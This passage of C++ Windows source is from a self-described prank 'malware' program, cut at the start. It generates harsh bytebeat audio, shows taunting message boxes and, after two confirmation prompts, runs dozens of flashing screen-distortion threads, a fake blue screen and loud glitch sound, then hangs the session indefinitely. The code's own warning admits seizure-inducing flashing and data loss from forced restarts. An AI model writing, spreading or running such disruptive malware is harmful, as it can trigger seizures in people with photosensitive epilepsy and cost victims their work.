    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8100 * 32] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(6969 - (2 * (t >> 5 & t) - (t >> 5) + t * (t >> 14 & 14)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 5 & t << 3) | 45));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t ^ (((t >> 5 | t << 3) & t << 2) + (12 + (t >> 4 & t >> 10))) & 128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t ^ (t >> 5 | t >> 8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 ^ t >> 8) + (t >> 5 & t >> 3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t / ((t & t >> 9) - 2) + (255) * (512 * t) * (t >> 7 ^ t >> 6) - 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (((t >> 16) + 5) & ~t >> (t & 2048 ? 2 : 3))) * 4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? 6 : 16) + (1 & t >> 14)) >> (3 & t >> 8) | t >> (t & 4096 ? 3 : 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 4) * (t >> 3) | t >> (t & 4096 ? 3 : 2));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t * t / (1 + (t >> 7 & t >> 6)))) * 126);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI soundbsod() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 13000, 13000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[13000 * 16] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1 | t) * (6));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI soundbreak() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4642, 4642, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[4642 * 219] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << 7);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//Extra
DWORD WINAPI Message1(LPVOID lpParam) {
    MessageBox(NULL, L"Why Did You Run This???", NULL, MB_ICONQUESTION);
    return 0;
}
DWORD WINAPI Message2(LPVOID lpParam) {
    MessageBox(NULL, L"Now You're CPU And GPU Will Fry!", NULL, MB_ICONEXCLAMATION);
    return 0;
}
DWORD WINAPI Message3(LPVOID lpParam) {
    MessageBox(NULL, L"I've Trusted You!!!", NULL, MB_ICONINFORMATION);
    return 0;
}
DWORD WINAPI Message4(LPVOID lpParam) {
    MessageBox(NULL, L"You Shouldn't Have Done All Of This!", NULL, MB_ICONEXCLAMATION);
    return 0;
}
DWORD WINAPI Message5(LPVOID lpParam) {
    MessageBox(NULL, L"You're Putting Your Computer In Trouble!", NULL, MB_ICONEXCLAMATION);
    return 0;
}
DWORD WINAPI Message6(LPVOID lpParam) {
    MessageBox(NULL, L"I'm Sorry But I Can't Help You...", NULL, MB_ICONINFORMATION);
    return 0;
}
DWORD WINAPI Message7(LPVOID lpParam) {
    MessageBox(NULL, L"Goodbye!", NULL, MB_ICONINFORMATION);
    return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//Code Execution
int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxW(NULL, L"You've Just Executed A Malware Called Eellogofusciouhipoppokunurious.exe! (It Means Good, Very Good) This Malware Won't Harm Your Computer Or Make It Unusuable But, It Has Flashing Lights And Epileptic Seizures! If You Proceed To Run This Malware Then Good Luck! This Malware Is Only Made For Testing Purposes As Trolling Someone With This Cound Cause Data Loss! (Ex. Your Friend Would Force Restart The Computer And Lose All His Unsaved Work.) So, Good Luck Testing It!", L"Eellogofusciouhipoppokunurious.exe - First Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"Are You Sure? If You Accidently Clicked On Yes Then This Is The Final Warning Now! Click Yes Again And The Malware Will Execute! This Is Your Last Chance To Stop This Program From Executing!!!", L"Eellogofusciouhipoppokunurious.exe - First Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            Sleep(3000);
            CreateThread(0, 0, Message1, 0, 0, 0);
            Sleep(3000);
            CreateThread(0, 0, Message2, 0, 0, 0);
            Sleep(3000);
            CreateThread(0, 0, Message3, 0, 0, 0);
            Sleep(3000);
            CreateThread(0, 0, Message4, 0, 0, 0);
            Sleep(3000);
            CreateThread(0, 0, Message5, 0, 0, 0);
            Sleep(3000);
            CreateThread(0, 0, Message6, 0, 0, 0);
            Sleep(3000);
            CreateThread(0, 0, Message7, 0, 0, 0);
            Sleep(3000);
            HANDLE threedbouncingcube = CreateThread(0, 0, ThreeDBouncingCube, 0, 0, 0);
            HANDLE shader1 = CreateThread(0, 0, Shader1, 0, 0, 0);
            PlaySoundW(L"sound1.wav", NULL, SND_FILENAME | SND_ASYNC);
            Sleep(30000);
            TerminateThread(shader1, 0);
            CloseHandle(shader1);
            InvalidateRect(0, 0, 0);
            HANDLE blur1 = CreateThread(0, 0, Blur1, 0, 0, 0);
            HANDLE bitblt1 = CreateThread(0, 0, BitBlt1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(blur1, 0);
            CloseHandle(blur1);
            TerminateThread(bitblt1, 0);
            CloseHandle(bitblt1);
            InvalidateRect(0, 0, 0);
            HANDLE bitblt2 = CreateThread(0, 0, BitBlt2, 0, 0, 0);
            HANDLE circles1 = CreateThread(0, 0, Circles1, 0, 0, 0);
            HANDLE circles2 = CreateThread(0, 0, Circles2, 0, 0, 0);
            HANDLE circles3 = CreateThread(0, 0, Circles3, 0, 0, 0);
            HANDLE circles4 = CreateThread(0, 0, Circles4, 0, 0, 0);
            HANDLE circles5 = CreateThread(0, 0, Circles5, 0, 0, 0);
            HANDLE circles6 = CreateThread(0, 0, Circles6, 0, 0, 0);
            HANDLE circles7 = CreateThread(0, 0, Circles7, 0, 0, 0);
            HANDLE colorshift = CreateThread(0, 0, ColorShift, 0, 0, 0);
            sound3();
            Sleep(32080);
            sound3_1();
            Sleep(32080);
            TerminateThread(bitblt2, 0);
            CloseHandle(bitblt2);
            TerminateThread(circles1, 0);
            CloseHandle(circles1);
            TerminateThread(circles2, 0);
            CloseHandle(circles2);
            TerminateThread(circles3, 0);
            CloseHandle(circles3);
            TerminateThread(circles4, 0);
            CloseHandle(circles4);
            TerminateThread(circles5, 0);
            CloseHandle(circles5);
            TerminateThread(circles6, 0);
            CloseHandle(circles6);
            TerminateThread(circles7, 0);
            CloseHandle(circles7);
            InvalidateRect(0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(colorshift, 0);
            CloseHandle(colorshift);
            InvalidateRect(0, 0, 0);
            HANDLE icons1 = CreateThread(0, 0, Icons1, 0, 0, 0);
            HANDLE swirl1 = CreateThread(0, 0, Swirl1, 0, 0, 0);
            HANDLE circles1_2 = CreateThread(0, 0, Circles1, 0, 0, 0);
            HANDLE circles2_2 = CreateThread(0, 0, Circles2, 0, 0, 0);
            HANDLE circles3_2 = CreateThread(0, 0, Circles3, 0, 0, 0);
            HANDLE circles4_2 = CreateThread(0, 0, Circles4, 0, 0, 0);
            HANDLE circles5_2 = CreateThread(0, 0, Circles5, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(swirl1, 0);
            CloseHandle(swirl1);
            TerminateThread(icons1, 0);
            CloseHandle(icons1);
            InvalidateRect(0, 0, 0);
            HANDLE squares1 = CreateThread(0, 0, Squares1, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(squares1, 0);
            CloseHandle(squares1);
            InvalidateRect(0, 0, 0);
            HANDLE shader2 = CreateThread(0, 0, Shader2, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(shader2, 0);
            CloseHandle(shader2);
            InvalidateRect(0, 0, 0);
            HANDLE shader3 = CreateThread(0, 0, Shader3, 0, 0, 0);
            PlaySoundW(L"sound8.wav", NULL, SND_FILENAME | SND_ASYNC);
            Sleep(10000);
            TerminateThread(shader3, 0);
            CloseHandle(shader3);
            HANDLE shader4 = CreateThread(0, 0, Shader4, 0, 0, 0);
            Sleep(10000);
            TerminateThread(shader4, 0);
            CloseHandle(shader4);
            HANDLE shader5 = CreateThread(0, 0, Shader5, 0, 0, 0);
            Sleep(10000);
            TerminateThread(shader5, 0);
            CloseHandle(shader5);
            InvalidateRect(0, 0, 0);
            HANDLE circles8 = CreateThread(0, 0, Circles8, 0, 0, 0);
            HANDLE rings = CreateThread(0, 0, Rings, 0, 0, 0);
            sound9();
            Sleep(30000);
            TerminateThread(circles8, 0);
            CloseHandle(circles8);
            TerminateThread(circles1_2, 0);
            CloseHandle(circles1_2);
            TerminateThread(circles2_2, 0);
            CloseHandle(circles2_2);
            TerminateThread(circles3_2, 0);
            CloseHandle(circles3_2);
            TerminateThread(circles4_2, 0);
            CloseHandle(circles4_2);
            TerminateThread(circles5_2, 0);
            CloseHandle(circles5_2);
            TerminateThread(threedbouncingcube, 0);
            CloseHandle(threedbouncingcube);
            TerminateThread(rings, 0);
            CloseHandle(rings);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt1 = CreateThread(0, 0, PlgBlt1, 0, 0, 0);
            sound10();
            Sleep(6000);
            TerminateThread(plgblt1, 0);
            CloseHandle(plgblt1);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt2 = CreateThread(0, 0, PlgBlt2, 0, 0, 0);
            Sleep(6000);
            TerminateThread(plgblt2, 0);
            CloseHandle(plgblt2);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt3 = CreateThread(0, 0, PlgBlt3, 0, 0, 0);
            Sleep(6000);
            TerminateThread(plgblt3, 0);
            CloseHandle(plgblt3);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt4 = CreateThread(0, 0, PlgBlt4, 0, 0, 0);
            Sleep(6000);
            TerminateThread(plgblt4, 0);
            CloseHandle(plgblt4);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt5 = CreateThread(0, 0, PlgBlt5, 0, 0, 0);
            Sleep(6000);
            TerminateThread(plgblt5, 0);
            CloseHandle(plgblt5);
            InvalidateRect(0, 0, 0);
            HANDLE shader8 = CreateThread(0, 0, Shader8, 0, 0, 0);
            sound11();
            Sleep(30000);
            TerminateThread(shader8, 0);
            CloseHandle(shader8);
            InvalidateRect(0, 0, 0);
            HANDLE shader9 = CreateThread(0, 0, Shader9, 0, 0, 0);
            sound12();
            Sleep(30000);
            TerminateThread(shader9, 0);
            CloseHandle(shader9);
            InvalidateRect(0, 0, 0);
            soundbsod();
            Sleep(1000);
            FakeBSOD(0, 0);
            ShowCursor();
            Sleep(1000);
            HANDLE shake = CreateThread(0, 0, Shake, 0, 0, 0);
            HANDLE invert = CreateThread(0, 0, Invert, 0, 0, 0);
            PlaySoundW(L"Glitch Final Loud.wav", NULL, SND_FILENAME | SND_ASYNC);
            Sleep(4000);
            HANDLE shader6 = CreateThread(0, 0, Shader6, 0, 0, 0);
            HANDLE shader7 = CreateThread(0, 0, Shader7, 0, 0, 0);
            Sleep(3000);
            HANDLE rotate = CreateThread(0, 0, Rotate, 0, 0, 0);
            HANDLE redflash = CreateThread(0, 0, RedFlash, 0, 0, 0);
            TerminateThread(shake, 0);
            CloseHandle(shake);
            TerminateThread(invert, 0);
            CloseHandle(invert);
            Sleep(5000);
            HANDLE rgbscroll = CreateThread(0, 0, RGBScroll, 0, 0, 0);
            Sleep(4000);
            HANDLE juliafractal = CreateThread(0, 0, JuliaFractal, 0, 0, 0);
            Sleep(6000);
            HANDLE shader8_2 = CreateThread(0, 0, Shader8, 0, 0, 0);
            HANDLE shader9_2 = CreateThread(0, 0, Shader9, 0, 0, 0);
            HANDLE shader10 = CreateThread(0, 0, Shader10, 0, 0, 0);
            HANDLE shader11 = CreateThread(0, 0, Shader11, 0, 0, 0);
            HANDLE shader12 = CreateThread(0, 0, Shader12, 0, 0, 0);
            HANDLE shader13 = CreateThread(0, 0, Shader13, 0, 0, 0);
            HANDLE shader14 = CreateThread(0, 0, Shader14, 0, 0, 0);
            HANDLE shader15 = CreateThread(0, 0, Shader15, 0, 0, 0);
            Sleep(5000);
            HANDLE shader16 = CreateThread(0, 0, Shader16, 0, 0, 0);
            HANDLE shader17 = CreateThread(0, 0, Shader17, 0, 0, 0);
            Sleep(5000);
            HANDLE shader18 = CreateThread(0, 0, ShaderFinal, 0, 0, 0);
            Sleep(4000);
            TerminateThread(shader6, 0);
            CloseHandle(shader6);
            TerminateThread(shader7, 0);
            CloseHandle(shader7);
            TerminateThread(rotate, 0);
            CloseHandle(rotate);
            TerminateThread(redflash, 0);
            CloseHandle(redflash);
            TerminateThread(rgbscroll, 0);
            CloseHandle(rgbscroll);
            TerminateThread(juliafractal, 0);
            CloseHandle(juliafractal);
            TerminateThread(shader8_2, 0);
            CloseHandle(shader8_2);
            TerminateThread(shader9_2, 0);
            CloseHandle(shader9_2);
            TerminateThread(shader10, 0);
            CloseHandle(shader10);
            TerminateThread(shader11, 0);
            CloseHandle(shader11);
            TerminateThread(shader12, 0);
            CloseHandle(shader12);
            TerminateThread(shader13, 0);
            CloseHandle(shader13);
            TerminateThread(shader14, 0);
            CloseHandle(shader14);
            TerminateThread(shader15, 0);
            CloseHandle(shader15);
            TerminateThread(shader16, 0);
            CloseHandle(shader16);
            TerminateThread(shader17, 0);
            CloseHandle(shader17);
            TerminateThread(shader18, 0);
            CloseHandle(shader18);
            InvalidateRect(0, 0, 0);
            HANDLE final = CreateThread(0, 0, ShaderFinal, 0, 0, 0);
            soundbreak();
            Sleep(-1);
            return 0;
        }

    }

}